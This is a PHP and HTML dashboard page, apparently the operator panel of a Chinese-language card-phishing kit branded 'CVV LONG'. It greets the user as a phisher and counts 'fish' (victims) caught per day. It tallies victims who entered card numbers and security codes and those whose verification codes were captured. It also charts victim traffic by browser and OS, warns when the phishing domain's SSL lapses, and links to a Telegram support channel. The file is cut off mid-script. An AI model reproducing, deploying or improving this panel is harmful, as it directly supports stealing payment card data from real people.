<?php
require_once 'config.php';

 $date = date('Y-m-d');

    $sql = "SELECT COUNT(*) FROM user_information where DATE(`date_created`) = '$date' ";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_form_received_today = $row[0];
    }

    $sql = "SELECT COUNT(*) FROM user_information";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_form_received = $row[0];
    }

    $sql = "SELECT COUNT(*) FROM user_information where cardnumber!='' and card_code!='' and DATE(date_created) = '$date' ";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_user_with_card = $row[0];
    }


    $sql = "SELECT COUNT(*) FROM user_information WHERE cardstatus = 'approve' and DATE(date_created) = '$date' ";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_user_card_approved = $row[0];
    }

    $sql = "SELECT COUNT(*) FROM user_information WHERE cardstatus = 'reject' and DATE(date_created) = '$date' ";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_user_card_reject = $row[0];
    }

    $sql = "SELECT COUNT(*) FROM user_information WHERE verificcode = '1' and DATE(date_created) = '$date' ";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_user_card_verify = $row[0];
    }


 $sql = "SELECT  DATE(`date_created`) Date, COUNT(DISTINCT `id`) totalCOunt FROM    user_information GROUP   BY  DATE(`date_created`) ORDER by date_created DESC LIMIT 5";


    $last_statastic = [];
    $last_statastic_count=0;
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
           $last_statastic_count += $row['totalCOunt'];
            $last_statastic[] = $row['totalCOunt'];
        }
    }
$last_statastic = implode(",", $last_statastic);


 $sql = "SELECT  MONTHNAME(`date_created`) month, COUNT(DISTINCT `id`) totalCOunt FROM    user_information GROUP   BY  MONTH(`date_created`) ORDER by date_created DESC limit 5";


    $month_statastic = [];
    $month_statastic_count=[];
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
           $month_statastic_count[] = $row['totalCOunt'];
            $month_statastic[] = "'".$row['month']."'";
        }
    }
$month_statastic = implode(",", $month_statastic);
$month_statastic_count = implode(",", $month_statastic_count);

/* Visitor Statistics */

$sql = "SELECT  DATE(`date_created`) Date, COUNT(DISTINCT `id`) totalCOunt FROM    visitor where WEEKOFYEAR(`date_created`)=WEEKOFYEAR(NOW())  GROUP   BY  DATE(`date_created`) ORDER by date_created DESC";

    $daily_video_statistic = [];
    $daily_video_statastic_count= [];
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
           $daily_video_statastic_count[] = $row['totalCOunt'];
            $daily_video_statistic[] = "'".$row['Date']."'";
        }
    }
$daily_video_statistic = implode(",", $daily_video_statistic);
$daily_video_statastic_count = implode(",", $daily_video_statastic_count);


    $sql = "SELECT COUNT(*) FROM user_information where cardnumber!='' and card_code!='' and WEEKOFYEAR(`date_created`)=WEEKOFYEAR(NOW())";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $total_user_with_card_visitor_wise = $row[0];
    }

    $sql = "SELECT  * FROM visitor GROUP   BY  ip_address";
    if ($result = mysqli_query($conn, $sql)) {
        $total_visitor_count = mysqli_num_rows($result);
    }

    $sql = "SELECT * FROM visitor where DATE(`date_created`) = '$date' GROUP   BY  ip_address ";
    if ($result = mysqli_query($conn, $sql)) {
        $today_visitor_count = mysqli_num_rows($result);
    }





/* Visitor Statistics*/

//require_once 'header.php';
//require_once 'menu_bar.php';


date_default_timezone_set('Asia/Tokyo');
$time=date('Hi');

//echo $time;
$theme_mode='day';
if (($time >= "0600") && ($time <= "1200")) {
  $admin_time_zone_msg = "Good Morning";
  $theme_mode='day';
}

elseif (($time >= "1201") && ($time <= "1600")) {
  $admin_time_zone_msg = "Good Afternoon";
  $theme_mode='day';
}

elseif (($time >= "1601") && ($time <= "2100")) {
  $admin_time_zone_msg = "Good Evening";
  $theme_mode='day';
}

elseif (($time >= "2101") && ($time <= "2400")) {
  $admin_time_zone_msg = "Good Night";
  $theme_mode='night';
}
else{
  $admin_time_zone_msg = "Why aren't you asleep?  Are you programming?<br>";
}


if (isset($_SERVER['HTTPS']) &&
    ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
    isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
    $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
  $protocol = 'https://'.$_SERVER['SERVER_NAME'];
}
else {
  $protocol = 'http://'.$_SERVER['SERVER_NAME'];
}

$stream = stream_context_create (array("ssl" => array("capture_peer_cert" => true)));
$read = @fopen($protocol, "rb", false, $stream);
$cont = @stream_context_get_params($read);
$var = ($cont["options"]["ssl"]["capture_peer_cert"]);
$ssl_checker = (!is_null($var)) ? true : false;

// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"])){
    header("location: /admin/login.php");
    exit;
}

?>

<!DOCTYPE html>

<html
  lang="en"
  class="light-style layout-menu-fixed"
  dir="ltr"
  data-theme="theme-default"
  data-assets-path="./assets/"
  data-template="vertical-menu-template-free"
>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"
    />

    <title>仪表盘</title>

    <meta name="description" content="" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="./assets/img/favicon/favicon.ico" />

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap"
      rel="stylesheet"
    />

    <!-- Icons. Uncomment required icon fonts -->
    <link rel="stylesheet" href="./assets/vendor/fonts/boxicons.css" />

    <!-- Core CSS -->
    <link rel="stylesheet" href="./assets/vendor/css/core.css" class="template-customizer-core-css" />
    <link rel="stylesheet" href="./assets/vendor/css/theme-default.css" class="template-customizer-theme-css" />
    <link rel="stylesheet" href="./assets/css/demo.css" />



    <!-- Vendors CSS -->
    <link rel="stylesheet" href="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />

    <link rel="stylesheet" href="./assets/vendor/libs/apex-charts/apex-charts.css" />

    <!-- Page CSS -->
    <?php if($theme_mode =='night') {?>
    <link rel="stylesheet" href="./assets/css/core-dark.css" />
    <link rel="stylesheet" href="./assets/css/theme-default-dark.css" />
    <?php }?>

    <!-- Helpers -->
    <script src="./assets/vendor/js/helpers.js"></script>
    <!-- Core JS -->

    <script src="./assets/vendor/libs/jquery/jquery.js"></script>

    <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
    <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
    <script src="./assets/js/config.js"></script>
  </head>

  <body>
    <!-- Layout wrapper -->
    <div class="layout-wrapper layout-content-navbar">
      <div class="layout-container">
        <!-- Menu -->

        <aside id="layout-menu" class="layout-menu menu-vertical menu bg-menu-theme">
          <div class="app-brand demo">
            <a href="/dashboard" class="app-brand-link">
              <span class="app-brand-logo demo">

              </span>
              <span class="app-brand-text demo menu-text fw-bolder ms-2">CVV LONG</span>
            </a>

            <a href="javascript:void(0);" class="layout-menu-toggle menu-link text-large ms-auto d-block d-xl-none">
              <i class="bx bx-chevron-left bx-sm align-middle"></i>
            </a>
          </div>

          <div class="menu-inner-shadow"></div>

          <ul class="menu-inner py-1">
            <!-- Dashboard -->
            <li class="menu-item active">
              <a href="index.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-home-circle"></i>
                <div data-i18n="Analytics">仪表盘</div> <!-- dashboard -->
              </a>
            </li>
			<li class="menu-item">
              <a href="users.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-table"></i>
                <div data-i18n="Analytics">操作台</div> <!-- user -->
              </a>
            </li>
            <li class="menu-item">
              <a href="setting.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-cog"></i>
                <div data-i18n="Analytics">设置</div> <!-- settings -->
              </a>
            </li>
            <li class="menu-item">
              <a href="/admin/logout.php" class="menu-link">
                <i class="menu-icon tf-icons bx bx-log-out"></i>
                <div data-i18n="Analytics">登出</div> <!-- Logout -->
              </a>
            </li>


          </ul>
        </aside>
        <!-- / Menu -->

        <!-- Layout container -->
        <div class="layout-page">
          <!-- Content wrapper -->
          <div class="content-wrapper">
            <!-- Content -->

            <div class="container-xxl flex-grow-1 container-p-y">
              <!-- Layout Demo -->
              <div class="layout-demo-wrapper">
                <div class="container-xxl flex-grow-1 container-p-y">










				  <div class="row">

				     <?php if($ssl_checker == ''){ ?>
				    <!-- warning -->
				    <div class="col-md-12 col-xl-12">
                      <div class="card bg-danger text-white mb-3">
                        <div class="card-body">
                          <h5 class="card-title text-white">防红警告!</h5>
                          <p class="card-text">你的网站域名已被检测，ssl已经失效，请及时处理</p>
                        </div>
                      </div>
                    </div>
                    <!-- warning -->
				     <?php } ?>





                <div class="col-lg-8 mb-4 order-0">
                  <div class="card">
                    <div class="d-flex align-items-end row">
                      <div class="col-sm-7">
                        <div class="card-body">
                          <h5 class="card-title text-primary">欢迎你，钓鱼佬！ 🎉</h5>
                          <p class="mb-4">
                            龙二温馨提示，今天收获 <span class="fw-bold"><?php echo $total_form_received_today; ?></span>  条鱼，请前往操作台进行查看！
                          </p>

                          <a href="https://t.me/cvvyuanma" class="btn btn-sm btn-outline-primary">技术支持</a>
                        </div>
                      </div>
                      <div class="col-sm-5 text-center text-sm-left" style="text-align: right !important;">
                        <div class="card-body pb-0 px-0 px-md-0">
                          <img
                            src="./assets/img/custom/man-with-laptop.png"
                            height="140"
                            alt="View Badge User"
                            data-app-dark-img="custom/man-with-laptop.png"
                            data-app-light-img="custom/man-with-laptop.png"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-lg-4 col-md-4 order-1">
                  <div class="row">
                    <div class="col-lg-6 col-md-12 col-6 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <div class="card-title d-flex align-items-start justify-content-between">
                            <div class="avatar flex-shrink-0">
                              <img
                                src="./assets/img/icons/unicons/chart-success.png"
                                alt="chart success"
                                class="rounded"
                              />
                            </div>
                            <div class="dropdown">
                              <button
                                class="btn p-0"
                                type="button"
                                id="cardOpt3"
                                data-bs-toggle="dropdown"
                                aria-haspopup="true"
                                aria-expanded="false"
                              >
                                <i class="bx bx-dots-vertical-rounded"></i>
                              </button>

                            </div>
                          </div>
                          <span class="fw-semibold d-block mb-1">访问人数</span>
                          <h3 class="card-title mb-2"><?php echo $today_visitor_count ?></h3>
                           <small class="text-success fw-semibold"><!--<i class="bx bx-up-arrow-alt"></i> +72.80%  --></small>
                        </div>
                      </div>
                    </div>
                    <div class="col-lg-6 col-md-12 col-6 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <div class="card-title d-flex align-items-start justify-content-between">
                            <div class="avatar flex-shrink-0">
                              <img
                                src="./assets/img/icons/unicons/wallet-info.png"
                                alt="Credit Card"
                                class="rounded"
                              />
                            </div>
                            <div class="dropdown">
                              <button
                                class="btn p-0"
                                type="button"
                                id="cardOpt6"
                                data-bs-toggle="dropdown"
                                aria-haspopup="true"
                                aria-expanded="false"
                              >
                                <i class="bx bx-dots-vertical-rounded"></i>
                              </button>

                            </div>
                          </div>
                          <span>已接码</span>
                          <h3 class="card-title text-nowrap mb-1"><?php echo $total_user_card_verify ?></h3>
                          <small class="text-success fw-semibold"><!-- <i class="bx bx-up-arrow-alt"></i> +28.42% --></small>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <!-- Total Revenue -->
                <div class="col-12 col-lg-8 order-2 order-md-3 order-lg-2 mb-4">
                  <div class="card">
                    <div class="row row-bordered g-0">
                      <div class="col-md-8">
                        <h5 class="card-header m-0 me-2 pb-3">每月统计数据</h5>
                        <div id="totalRevenueChart" class="px-2"></div>









                      </div>
                      <div class="col-md-4">
                        <div class="card-body">
                          <div class="text-center">
                            <?php echo $date ?>
                          </div>
                        </div>
                        <div id="growthChart"></div>
                       <!-- <div class="text-center fw-semibold pt-3 mb-2"><?php echo $total_visitor_count; ?> Total Visitor</div>
                        <hr>
                        <div class="text-center fw-semibold pt-3 mb-2"><?php echo $total_form_received; ?> Total User Filled Form</div> -->


                      </div>
                    </div>
                  </div>
                </div>
                <!--/ Total Revenue -->
                <div class="col-12 col-md-8 col-lg-4 order-3 order-md-2">
                  <div class="row">
                    <div class="col-6 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <div class="card-title d-flex align-items-start justify-content-between">
                            <div class="avatar flex-shrink-0">
                              <img src="./assets/img/icons/unicons/paypal.png" alt="Credit Card" class="rounded" />
                            </div>
                            <div class="dropdown">
                              <button
                                class="btn p-0"
                                type="button"
                                id="cardOpt4"
                                data-bs-toggle="dropdown"
                                aria-haspopup="true"
                                aria-expanded="false"
                              >
                                <i class="bx bx-dots-vertical-rounded"></i>
                              </button>

                            </div>
                          </div>
                          <span class="d-block mb-1">已拒绝（未接验证）</span>
                          <h3 class="card-title text-nowrap mb-2"><?php echo $total_user_card_reject ?></h3>
                         <!-- <small class="text-danger fw-semibold"><i class="bx bx-down-arrow-alt"></i> -14.82%</small> -->
                        </div>
                      </div>
                    </div>
                    <div class="col-6 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <div class="card-title d-flex align-items-start justify-content-between">
                            <div class="avatar flex-shrink-0">
                              <img src="./assets/img/icons/unicons/cc-primary.png" alt="Credit Card" class="rounded" />
                            </div>
                            <div class="dropdown">
                              <button
                                class="btn p-0"
                                type="button"
                                id="cardOpt1"
                                data-bs-toggle="dropdown"
                                aria-haspopup="true"
                                aria-expanded="false"
                              >
                                <i class="bx bx-dots-vertical-rounded"></i>
                              </button>

                            </div>
                          </div>
                          <span class="fw-semibold d-block mb-1">全资鱼（未接码)</span>
                          <h3 class="card-title mb-2"><?php echo $total_user_with_card ?></h3>
                          <!-- <small class="text-success fw-semibold"><i class="bx bx-up-arrow-alt"></i> +28.14%</small> -->
                        </div>
                      </div>
                    </div>
                    <!-- </div>
    <div class="row"> -->
                    <div class="col-12 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <div class="d-flex justify-content-between flex-sm-row flex-column gap-3">
                            <div class="d-flex flex-sm-column flex-row align-items-start justify-content-between">
                              <div class="card-title">
                                <h5 class="text-nowrap mb-2">最近概况</h5>
                                <span class="badge bg-label-warning rounded-pill">五天内</span>
                              </div>
                              <div class="mt-sm-auto">

                                <h3 class="mb-0"><?php echo $last_statastic_count ?></h3>
                              </div>
                            </div>
                            <div id="profileReportChart"></div>

                            <script>
                            jQuery( document ).ready(function() {
                              // Profit Report Line Chart
                              // --------------------------------------------------------------------
                              const profileReportChartEl = document.querySelector('#profileReportChart'),
                                profileReportChartConfig = {
                                  chart: {
                                    height: 80,
                                    // width: 175,
                                    type: 'line',
                                    toolbar: {
                                      show: false
                                    },
                                    dropShadow: {
                                      enabled: true,
                                      top: 10,
                                      left: 5,
                                      blur: 3,
                                      color: config.colors.warning,
                                      opacity: 0.15
                                    },
                                    sparkline: {
                                      enabled: true
                                    }
                                  },
                                  grid: {
                                    show: false,
                                    padding: {
                                      right: 8
                                    }
                                  },
                                  colors: [config.colors.warning],
                                  dataLabels: {
                                    enabled: false
                                  },
                                  stroke: {
                                    width: 5,
                                    curve: 'smooth'
                                  },
                                  series: [
                                    {
                                      data: [<?php echo $last_statastic ?>]
                                    }
                                  ],
                                  xaxis: {
                                    show: false,
                                    lines: {
                                      show: false
                                    },
                                    labels: {
                                      show: false
                                    },
                                    axisBorder: {
                                      show: false
                                    }
                                  },
                                  yaxis: {
                                    show: false
                                  }
                                };
                              if (typeof profileReportChartEl !== undefined && profileReportChartEl !== null) {
                                const profileReportChart = new ApexCharts(profileReportChartEl, profileReportChartConfig);
                                profileReportChart.render();
                              }
                            });
                            </script>


                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

				  <div class="row">



        			    <!-- Expense Overview -->
                        <div class="col-md-6 col-lg-6 order-1 mb-4">
                          <div class="card h-100">
                            <div class="card-header">
                              <h5 class="m-0 me-2">鱼站页面流量趋势图</h5>
                            </div>
                            <div class="card-body px-0">
                              <div class="tab-content p-0">
                                <div class="tab-pane fade show active" id="navs-tabs-line-card-income" role="tabpanel">
                                  <div class="d-flex p-4 pt-3">
                                    <div class="avatar flex-shrink-0 me-3 bg-label-info p-2">
                                      <i class="bx bxs-group text-info"></i>
                                    </div>

                                    <div>
                                      <small class="text-muted d-block">上鱼量</small>
                                      <div class="d-flex align-items-center">
                                        <h6 class="mb-0 me-1"><?php echo $total_user_with_card_visitor_wise ?></h6>

                                      </div>
                                    </div>
                                  </div>
                                  <div id="incomeChart"></div>
                                  <div class="d-flex justify-content-center pt-4 gap-2">
                                    <div class="flex-shrink-0">
                                      <div id="expensesOfWeek"></div>
                                    </div>
                                    <div>
                                      <p class="mb-n1 mt-1">本周数据</p>
                                      <small class="text-muted"><?php echo $total_user_with_card_visitor_wise ?> 填卡用户</small>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>




                        <!--/ Expense Overview -->




				       <!-- pill table -->
  <div class="col-md-6 order-3 order-lg-4 mb-4 mb-lg-0">
    <div class="card text-center">
      <div class="card-header py-3">
        <ul class="nav nav-pills" role="tablist">
          <li class="nav-item">
            <button type="button" class="nav-link active" role="tab" data-bs-toggle="tab" data-bs-target="#navs-pills-browser" aria-controls="navs-pills-browser" aria-selected="true">浏览器</button>
          </li>
          <li class="nav-item">
            <button type="button" class="nav-link" role="tab" data-bs-toggle="tab" data-bs-target="#navs-pills-os" aria-controls="navs-pills-os" aria-selected="false">操作系统</button>
          </li>
          <li class="nav-item">
            <button type="button" class="nav-link" role="tab" data-bs-toggle="tab" data-bs-target="#navs-pills-mos" aria-controls="navs-pills-mos" aria-selected="false">移动操作系统</button>
          </li>
        </ul>
      </div>
      <div class="tab-content pt-0">
        <div class="tab-pane fade show active" id="navs-pills-browser" role="tabpanel">
          <div class="table-responsive text-start">
            <table class="table table-borderless text-nowrap">
              <thead>
                <tr>
                  <th>No</th>
                  <th>浏览器</th> <!-- browser -->
                  <th>访问</th> <!-- visit -->
                  <th class="w-50">数据百分比</th> <!-- data in percentage -->
                </tr>
              </thead>
              <tbody>

                <?php

                $sql = "SELECT COUNT(*) as total, (COUNT(*)/x.m)*100 AS percentage ,browser FROM visitor CROSS JOIN ( SELECT COUNT(*) as m from visitor ) x GROUP BY browser ORDER BY `percentage` DESC";
                $browser_statastic = [];
                $browser_number = 0;
                if ($result = mysqli_query($conn, $sql)) {
                    while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {

                        $browser_number+=1;

                        $browser = $row['browser'];
                        $percentage = round($row['percentage']);
                        $browser_hit = round($row['total']);
                        if($browser == 'Google Chrome')
                        {
                            $img_url = 'chrome.png';
                            $progress_color = "bg-success";
                        }else if($browser == 'Mozilla Firefox')
                        {
                            $img_url = 'firefox.png';
                            $progress_color = "bg-primary";
                        }else if($browser == 'Internet Explorer')
                        {
                            $img_url = 'edge.png';
                            $progress_color = "bg-info";
                        }else if($browser == 'Apple Safari')
                        {
                            $img_url = 'safari.png';
                            $progress_color = "bg-warning";
                        }else if($browser == 'Opera')
                        {
                            $img_url = 'opera.png';
                            $progress_color = "bg-danger";
                        }else{
                            $img_url = 'here';
                            $progress_color = "bg-danger";
                        }?>
                        <tr>
                          <td><?php echo $browser_number; ?></td>
                          <td>
                            <div class="d-flex align-items-center">
                              <img src="./assets/img/browser/<?php echo $img_url; ?>" alt="Chrome" height="24" class="me-2">
                              <span><?php echo $browser; ?></span>
                            </div>
                          </td>
                          <td><?php echo $browser_hit; ?></td>
                          <td>
                            <div class="d-flex justify-content-between align-items-center gap-3">
                              <div class="progress w-100" style="height:10px;">
                                <div class="progress-bar <?php echo $progress_color; ?>" role="progressbar" style="width: <?php echo $percentage; ?>%" aria-valuenow="<?php echo $percentage; ?>" aria-valuemin="0" aria-valuemax="100"></div>
                              </div>
                              <small class="fw-semibold"><?php echo $percentage; ?>%</small>
                            </div>
                          </td>
                        </tr>

                        <?php


                            }
                        }
                    ?>

              </tbody>
            </table>
          </div>
        </div>
        <div class="tab-pane fade" id="navs-pills-os" role="tabpanel">
          <div class="table-responsive text-start">
            <table class="table table-borderless">
              <thead>
                <tr>
                  <th>No</th>
                  <th>系统</th>
                  <th>访问</th> <!-- visit -->
                  <th class="w-50">数据百分比</th> <!-- data in percentage -->
                </tr>
              </thead>
              <tbody>

                <?php

                $sql = "SELECT COUNT(*) as total, (COUNT(*)/x.m)*100 AS percentage ,platform FROM visitor as new CROSS JOIN ( SELECT COUNT(*) as m from visitor where platform_type='pc' ) x WHERE new.platform_type='pc' GROUP BY platform ORDER BY `percentage` DESC";
                $browser_statastic = [];
                $platform_number = 0;
                if ($result = mysqli_query($conn, $sql)) {
                    while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {



                        $platform_number+=1;

                        $platform = $row['platform'];
                        $percentage = round($row['percentage']);
                        $platform_hit = round($row['total']);
                        if($platform == 'windows')
                        {
                            $img_url = 'windows.png';
                            $progress_color = "bg-success";
                        }else if($platform == 'linux')
                        {
                            $img_url = 'linux.png';
                            $progress_color = "bg-primary";
                        }else if($platform == 'mac')
                        {
                            $img_url = 'mac.png';
                            $progress_color = "bg-info";
                        }?>
                        <tr>
                          <td><?php echo $platform_number; ?></td>
                          <td>
                            <div class="d-flex align-items-center">
                              <img src="./assets/img/platform/<?php echo $img_url; ?>" alt="Chrome" height="24" class="me-2">
                              <span class="text-capitalize"><?php echo $platform; ?></span>
                            </div>
                          </td>
                          <td><?php echo $platform_hit; ?></td>
                          <td>
                            <div class="d-flex justify-content-between align-items-center gap-3">
                              <div class="progress w-100" style="height:10px;">
                                <div class="progress-bar <?php echo $progress_color; ?>" role="progressbar" style="width: <?php echo $percentage; ?>%" aria-valuenow="<?php echo $percentage; ?>" aria-valuemin="0" aria-valuemax="100"></div>
                              </div>
                              <small class="fw-semibold"><?php echo $percentage; ?>%</small>
                            </div>
                          </td>
                        </tr>

                        <?php


                    }
                }
                ?>



              </tbody>
            </table>
          </div>
        </div>



        <div class="tab-pane fade" id="navs-pills-mos" role="tabpanel">
          <div class="table-responsive text-start">
            <table class="table table-borderless">
              <thead>
                <tr>
                  <th>No</th>
                  <th>系统</th>
                  <th>访问</th> <!-- visit -->
                  <th class="w-50">数据百分比</th> <!-- data in percentage -->
                </tr>
              </thead>
              <tbody>

                <?php

                $sql = "SELECT COUNT(*) as total, (COUNT(*)/x.m)*100 AS percentage ,platform FROM visitor as new CROSS JOIN ( SELECT COUNT(*) as m from visitor where platform_type='mobile' ) x WHERE new.platform_type='mobile' GROUP BY platform ORDER BY `percentage` DESC";
                $browser_statastic = [];
                $platform_number = 0;
                if ($result = mysqli_query($conn, $sql)) {
                    while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {

                        $platform_number+=1;

                        $platform = $row['platform'];
                        $percentage = round($row['percentage']);
                        $platform_hit = round($row['total']);
                        if($platform == 'iPod')
                        {
                            $img_url = 'apple-icon.png';
                            $progress_color = "bg-success";
                        }else if($platform == 'iPad')
                        {
                            $img_url = 'apple-icon.png';
                            $progress_color = "bg-primary";
                        }else if($platform == 'iPhone')
                        {
                            $img_url = 'apple-icon.png';
                            $progress_color = "bg-info";
                        }else if($platform == 'Android')
                        {
                            $img_url = 'android-icon.png';
                            $progress_color = "bg-info";
                        }else if($platform == 'iOS')
                        {
                            $img_url = 'apple-icon.png';
                            $progress_color = "bg-info";
                        }?>
                        <tr>
                          <td><?php echo $platform_number; ?></td>
                          <td>
                            <div class="d-flex align-items-center">
                              <img src="./assets/img/platform/<?php echo $img_url; ?>" alt="Chrome" height="24" class="me-2">
                              <span class="text-capitalize"><?php echo $platform; ?></span>
                            </div>
                          </td>
                          <td><?php echo $platform_hit; ?></td>
                          <td>
                            <div class="d-flex justify-content-between align-items-center gap-3">
                              <div class="progress w-100" style="height:10px;">
                                <div class="progress-bar <?php echo $progress_color; ?>" role="progressbar" style="width: <?php echo $percentage; ?>%" aria-valuenow="<?php echo $percentage; ?>" aria-valuemin="0" aria-valuemax="100"></div>
                              </div>
                              <small class="fw-semibold"><?php echo $percentage; ?>%</small>
                            </div>
                          </td>
                        </tr>

                        <?php


                    }
                }
                ?>



              </tbody>
            </table>
          </div>
        </div>






      </div>
    </div>
  </div>
  <!--/ pill table -->




				  </div>

				</div>
			  </div>
              <!--/ Layout Demo -->
            </div>
            <!-- / Content -->

            <!-- Footer -->
            <footer class="content-footer footer bg-footer-theme">
              <div class="container-xxl d-flex flex-wrap justify-content-between py-2 flex-md-row flex-column">
                <div class="mb-2 mb-md-0">
                  ©
                  <script>
                    document.write(new Date().getFullYear());
                  </script>
                  , 1.0版本 ❤️

                </div>
              </div>
            </footer>
            <!-- / Footer -->

            <div class="content-backdrop fade"></div>
          </div>
          <!-- Content wrapper -->
        </div>
        <!-- / Layout page -->
      </div>

      <!-- Overlay -->
      <div class="layout-overlay layout-menu-toggle"></div>
    </div>
    <!-- / Layout wrapper -->



    <!-- Core JS -->
    <!-- build:js assets/vendor/js/core.js -->
    <script src="./assets/vendor/libs/jquery/jquery.js"></script>
    <script src="./assets/vendor/libs/popper/popper.js"></script>
    <script src="./assets/vendor/js/bootstrap.js"></script>
    <script src="./assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>

    <script src="./assets/vendor/js/menu.js"></script>
    <!-- endbuild -->

    <!-- Vendors JS -->
    <script src="./assets/vendor/libs/apex-charts/apexcharts.js"></script>


    <!-- Main JS -->
    <script src="./assets/js/main.js"></script>

    <!-- Page JS -->
    <script src="./assets/js/dashboards-analytics.js"></script>

    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>



<script>

  // Total Revenue Report Chart - Bar Chart
  // --------------------------------------------------------------------

   let cardColor, headingColor, axisColor, shadeColor, borderColor;

  cardColor = config.colors.white;
  headingColor = config.colors.headingColor;
  axisColor = config.colors.axisColor;
  borderColor = config.colors.borderColor;

  const totalRevenueChartEl = document.querySelector('#totalRevenueChart'),
    totalRevenueChartOptions = {
      series: [
        {
          name: 'Request Receive',
           data: [<?php echo $month_statastic_count ?>]

        },

      ],
      chart: {
        height: 300,
        stacked: true,
        type: 'bar',
        toolbar: { show: false }
      },
      plotOptions: {
        bar: {
          horizontal: false,
          columnWidth: '33%',
          borderRadius: 12,
          startingShape: 'rounded',
          endingShape: 'rounded'
        }
      },
      colors: [config.colors.primary, config.colors.info],
      dataLabels: {
        enabled: false
      },
      stroke: {
        curve: 'smooth',
        width: 6,
        lineCap: 'round',
        colors: [cardColor]
      },
      legend: {
        show: true,
        horizontalAlign: 'left',
        position: 'top',
        markers: {
          height: 8,
          width: 8,
          radius: 12,
          offsetX: -3
        },
        labels: {
          colors: axisColor
        },
        itemMargin: {
          horizontal: 10
        }
      },
      grid: {
        borderColor: borderColor,
        padding: {
          top: 0,
          bottom: -8,
          left: 20,
          right: 20
        }
      },
      xaxis: {
       categories: [<?php echo $month_statastic ?>],

        labels: {
          style: {
            fontSize: '13px',
            colors: axisColor
          }
        },
        axisTicks: {
          show: false
        },
        axisBorder: {
          show: false
        }
      },
      yaxis: {
        labels: {
          style: {
            fontSize: '13px',
            colors: axisColor
          }
        }
      },
      responsive: [
        {
          breakpoint: 1700,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '32%'
              }
            }
          }
        },
        {
          breakpoint: 1580,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '35%'
              }
            }
          }
        },
        {
          breakpoint: 1440,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '42%'
              }
            }
          }
        },
        {
          breakpoint: 1300,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '48%'
              }
            }
          }
        },
        {
          breakpoint: 1200,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '40%'
              }
            }
          }
        },
        {
          breakpoint: 1040,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 11,
                columnWidth: '48%'
              }
            }
          }
        },
        {
          breakpoint: 991,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '30%'
              }
            }
          }
        },
        {
          breakpoint: 840,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '35%'
              }
            }
          }
        },
        {
          breakpoint: 768,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '28%'
              }
            }
          }
        },
        {
          breakpoint: 640,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '32%'
              }
            }
          }
        },
        {
          breakpoint: 576,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '37%'
              }
            }
          }
        },
        {
          breakpoint: 480,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '45%'
              }
            }
          }
        },
        {
          breakpoint: 420,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '52%'
              }
            }
          }
        },
        {
          breakpoint: 380,
          options: {
            plotOptions: {
              bar: {
                borderRadius: 10,
                columnWidth: '60%'
              }
            }
          }
        }
      ],
      states: {
        hover: {
          filter: {
            type: 'none'
          }
        },
        active: {
